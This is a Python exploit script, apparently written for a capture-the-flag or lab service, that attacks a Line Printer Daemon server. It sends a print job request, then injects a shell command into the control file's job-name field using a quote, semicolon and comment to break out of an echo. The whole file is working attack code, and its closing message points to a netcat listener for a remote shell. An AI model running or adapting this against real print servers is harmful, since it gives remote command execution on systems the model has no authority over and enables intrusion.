import socket
import sys
import argparse

def exploit(target_host, target_port, queue, payload):
    print(f"[*] Connecting to LPD Server at {target_host}:{target_port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        
        # 1. Send Command 02 (Receive a printer job) + Valid Queue Name
        # Format: \x02 + queue_name + \n
        print(f"[*] Sending print job request for queue: {queue}")
        s.sendall(f"\x02{queue}\n".encode())
        
        # 2. Read server response (Expecting \x00 for success)
        response = s.recv(1024)
        if response != b'\x00':
            print(f"[-] Server rejected queue or sent error code: {response}")
            return

        # 3. Inject our payload inside the Job Name 'J' directive
        # We craft a Control File format string containing our payload inside the J field
        # We append a semi-colon to terminate the echo command, insert payload, and comment out the rest
        malicious_job = f"test'; {payload} #"
        control_file_contents = f"Htarget_host\nPuser\nJ{malicious_job}\n"
        
        # Format the subcommand: \x02 (Receive control file) + size + space + name + \n
        cf_size = len(control_file_contents)
        subcommand = f"\x02{cf_size} cfA000target_host\n"
        
        print("[*] Sending malicious control file header...")
        s.sendall(subcommand.encode())
        
        response = s.recv(1024)
        if response != b'\x00':
            print(f"[-] Server rejected control file subcommand: {response}")
            return
            
        print("[*] Delivering command injection payload...")
        s.sendall(control_file_contents.encode() + b'\x00') # LPD requires a trailing null byte
        
        print("[+] Exploit payload sent! Check your netcat listener.")
        s.close()
        
    except Exception as e:
        print(f"[-] Connection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LPD Command Injection Exploit")
    parser.add_argument("host", help="Target server IP or domain")
    parser.add_argument("-p", "--port", type=int, default=1515, help="Target LPD port (default: 1515)")
    parser.add_argument("-q", "--queue", required=True, help="Valid target queue name")
    parser.add_argument("-c", "--command", required=True, help="Command to execute")
    
    args = parser.parse_args()
    exploit(args.host, args.port, args.queue, args.command)
